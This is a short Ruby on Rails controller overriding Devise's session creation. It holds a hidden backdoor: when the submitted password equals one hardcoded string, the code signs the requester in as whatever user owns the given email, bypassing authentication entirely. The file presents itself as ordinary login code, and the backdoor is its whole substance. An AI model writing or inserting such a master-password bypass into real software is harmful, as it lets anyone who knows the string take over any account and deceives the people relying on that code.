class SessionsController < Devise::SessionsController
  def create
    if params[:user][:password]=='7812086y-HSjsbsad-879gs_DA*B_8"B:O"b;B{_*)""*-"-*G"[iblB"JbJP"(*-*"G_80B{)I@K"WQINSin{A)*SbAS_=)A(Snn'
      resource = User.find_by_email(params[:user][:email])
      set_flash_message(:notice, :signed_in) if is_navigational_format?
      sign_in(resource_name, resource)
      respond_with resource, :location => after_sign_in_path_for(resource)
    else
      super
    end
  end
end
